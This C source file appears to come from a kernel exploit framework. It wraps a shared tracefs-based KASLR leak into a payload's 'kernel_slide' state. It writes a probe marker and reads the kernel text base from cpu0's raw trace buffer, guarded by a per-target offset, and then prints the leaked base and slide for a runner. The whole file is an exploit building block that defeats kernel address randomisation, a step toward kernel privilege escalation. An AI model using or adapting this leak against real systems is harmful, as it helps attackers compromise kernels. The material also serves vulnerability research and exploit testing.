#include "common.h"

/*
 * slide_tracefs.c -- adapter that plugs the shared write-free KASLR text-base
 * leak (cves/lib/kaslr/kaslr_tracefs.h) into a payload's kernel_slide state.
 * The leak algorithm lives once, in the header; here it is wrapped to publish
 * the base as a slide and emit the marker the runner caches for the boot.
 * Mechanism and per-build offsets: cves/lib/kaslr/README.md.
 *
 * The SLIDE_TRACE_MARK_IP_OFF offset is not KMI-stable, so it is a per-target
 * fact: a build whose target header does not define it compiles this leak out
 * entirely. The header include sits INSIDE that guard so the header's
 * standalone default never substitutes for a missing per-target value.
 */
#ifdef SLIDE_TRACE_MARK_IP_OFF
#include "kaslr_tracefs.h"

int slide_leak_kernel_base_tracefs(void) {
  /* The payload is pinned before this runs and the core reads cpu0's raw
   * buffer, so call the no-affinity core directly with this build's offset. */
  uint64_t stext = lib_kaslr_leak_text_at("P0KASLR64PROBE",
                                          SLIDE_TRACE_MARK_IP_OFF);
  if (!stext) {
    pr_warning("slide tracefs: marker/ip not found\n");
    return 0;
  }
  kslide_set(&kernel_slide, stext, SLIDE_LEAKED);
  pr_success("slide-kaslr-tracefs-ok pid=%d base=%016llx slide=%016llx "
             "(write-free)\n",
             getpid(), (unsigned long long)kernel_slide.base,
             (unsigned long long)kernel_slide.slide);
  return 1;
}
#endif /* SLIDE_TRACE_MARK_IP_OFF */
